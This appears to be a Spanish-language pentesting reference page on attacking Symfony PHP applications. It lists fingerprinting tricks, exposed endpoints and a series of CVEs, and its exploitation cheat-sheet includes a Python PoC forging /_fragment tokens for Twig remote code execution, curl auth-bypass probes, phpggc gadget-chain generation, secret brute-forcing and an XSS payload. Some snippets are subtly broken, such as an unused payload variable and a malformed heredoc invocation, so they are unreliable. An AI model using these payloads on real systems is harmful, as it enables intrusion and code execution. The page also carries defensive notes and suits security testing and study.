# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony es uno de los frameworks PHP más utilizados y aparece con regularidad en evaluaciones de objetivos empresariales, e-commerce y CMS (Drupal, Shopware, Ibexa, OroCRM … todos integran componentes de Symfony). Esta página reúne consejos ofensivos, malas configuraciones comunes y vulnerabilidades recientes que deberías tener en tu checklist cuando descubras una aplicación Symfony.

> Nota histórica: Gran parte del ecosistema aún ejecuta la rama **5.4 LTS** (EOL **noviembre 2025**). Symfony **7.4** se convirtió en la nueva LTS en **nov 2025** y recibirá correcciones de seguridad hasta **nov 2029**. Verifica siempre el nivel exacto de parche porque muchos avisos de 2024‑2026 se arreglaron solo en micro-releases.

---

## Recon & Enumeración

### Finger-printing
* Encabezados de respuesta HTTP: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` o cookies que empiezan con `sf_redirect`, `sf_session`, `MOCKSESSID`.
* Código fuente leaks (`composer.json`, `composer.lock`, `/vendor/…`) frecuentemente revelan la versión exacta:
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* Rutas públicas que solo existen en Symfony:
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (pretty error pages)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)
* Wappalyzer, BuiltWith o wordlists de ffuf/feroxbuster: `symfony.txt` → busca `/_fragment`, `/_profiler`, `.env`, `.htaccess`.

### Interesting files & endpoints
| Path | Why it matters |
|------|----------------|
| `/.env`, `/.env.local`, `/.env.prod` | Frequently mis-deployed → leaks `APP_SECRET`, credenciales DB, SMTP, claves AWS |
| `/.git`, `.svn`, `.hg` | Source disclosure → credenciales + lógica de negocio |
| `/var/log/*.log`, `/log/dev.log` | Web-root mis-configuration exposes stack-traces |
| `/_profiler` | Historial completo de requests, configuración, service container, **APP_SECRET** (≤ 3.4) |
| `/_fragment` | Punto de entrada usado por ESI/HInclude. Abuse posible una vez que conoces `APP_SECRET` |
| `/vendor/phpunit/phpunit/phpunit` | PHPUnit RCE si es accesible (CVE-2017-9841) |
| `/index.php/_error/{code}` | Finger-print & a veces leak trazas de excepción |

---

## High-impact Vulnerabilities

### 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)
* **CVE-2019-18889** originalmente, pero *todavía* aparece en objetivos modernos cuando el debug queda activado o se expone `.env`.
* Una vez que conoces el `APP_SECRET` de 32 caracteres, fabrica un token HMAC y abusa del controlador interno `render()` para ejecutar Twig arbitrario:
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* Excelente write-up & script de explotación: Ambionics blog (enlazado en References).

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* Afecta versiones anteriores a 5.4.50, 6.4.29 y 7.3.7. La normalización de paths podía eliminar la `/` inicial, rompiendo reglas de control de acceso que asumen `/admin`, etc.
* Prueba rápida: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → si alcanza rutas admin sin autenticación, lo encontraste.
* Parche: actualizar `symfony/http-foundation` o el framework completo al nivel de parche corregido.

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* Afecta versiones anteriores a 5.4.51, 6.4.33, 7.3.11, 7.4.5 y 8.0.5 en Windows cuando PHP se ejecuta desde MSYS2 (Git-Bash, mingw). `Process` no quoteaba `=` provocando paths corruptos; comandos destructivos (`rmdir`, `del`) pueden apuntar a directorios no previstos.
* Si puedes subir un script PHP o influir helpers de Composer/CLI que llaman a `Process`, construye argumentos con `=` (p. ej. `E:/=tmp/delete`) para causar reescritura de paths.

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* Cuando `register_argv_argc=On` y usando runtimes no-SAPI, cadenas de consulta manipuladas podían volcar `APP_ENV`/`APP_DEBUG` vía parsing de `argv`. Parcheado en 5.4.46/6.4.14/7.1.7.
* Busca `/?--env=prod` o similares aceptados en logs.

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* Caracteres especiales en la URI no se validaban de la misma manera que lo hacen los navegadores, permitiendo redirecciones a dominios controlados por el atacante. Corregido en 5.4.46/6.4.14/7.1.7.

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` & `symfony/ux-live-component` antes de **2.25.1** renderizan `{{ attributes }}` sin escapar → attribute injection/XSS. Si la app permite a usuarios definir atributos de componentes (admin CMS, plantillas de email) puedes encadenar a inyección de script.
* Actualiza ambos paquetes a 2.25.1+. Como exploit manual, coloca JS en un valor de atributo pasado a un componente custom y dispara el renderizado.

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* El componente `Process` buscaba el directorio de trabajo actual **antes** que `PATH` en Windows. Un atacante capaz de subir `tar.exe`, `cmd.exe`, etc. en un web-root escribible y disparar `Process` (p. ej. extracción de archivos, generación de PDF) obtiene ejecución de comandos.
* Parcheado en 5.4.50, 6.4.14, 7.1.7.

### 8. Session-Fixation – **CVE-2023-46733**
* El authentication guard reutilizaba un ID de sesión existente después del login. Si un atacante fija la cookie **antes** de que la víctima se autentique, secuestra la cuenta tras el login.

### 9. Twig sandbox XSS – **CVE-2023-46734**
* En aplicaciones que exponen templates controlados por usuarios (admin CMS, constructor de emails) el filtro `nl2br` podía ser abusado para evadir el sandbox e inyectar JS.

### 10. Symfony 1 gadget chains (still found in legacy apps)
* `phpggc symfony/1 system id` produce un payload Phar que desencadena RCE cuando ocurre un unserialize() en clases como `sfNamespacedParameterHolder`. Revisa endpoints de subida de archivos y wrappers `phar://`.

{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## Exploitation Cheat-Sheet

### Calcular token HMAC para `/_fragment`
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### Bruteforce a `APP_SECRET` débil
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### RCE vía Symfony Console expuesto
Si `bin/console` es accesible a través de `php-fpm` o mediante subida directa por CLI:
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
Usa deserialization gadgets dentro del cache directory o escribe un Twig template malicioso que se ejecutará en la siguiente petición.

### Prueba rápidamente el PATH_INFO bypass (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
Si la salida renderizada imprime el atributo sin escaparlo, XSS tiene éxito. Actualizar a 2.25.1+.

---

## Notas defensivas
1. **Nunca despliegues debug** (`APP_ENV=dev`, `APP_DEBUG=1`) en producción; bloquea `/app_dev.php`, `/_profiler`, `/_wdt` en la configuración del servidor web.
2. Almacena secretos en variables de entorno o `vault/secrets.local.php`, *nunca* en archivos accesibles desde el document-root.
3. Aplica gestión de parches – suscríbete a los avisos de seguridad de Symfony y mantén al menos el nivel de parche LTS (5.4.x until Nov 2025, 6.4 until Nov 2027, 7.4 until Nov 2029).
4. Si ejecutas en Windows, actualiza inmediatamente para mitigar CVE-2024-51736 & CVE-2026-24739 o añade un `open_basedir`/`disable_functions` defence-in-depth.

---

### Useful offensive tooling
* **ambionics/symfony-exploits** – secret-fragment RCE, debugger routes discovery.
* **phpggc** – Ready-made gadget chains for Symfony 1 & 2.
* **sf-encoder** – small helper to compute `_fragment` HMAC (Go implementation).



## References
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
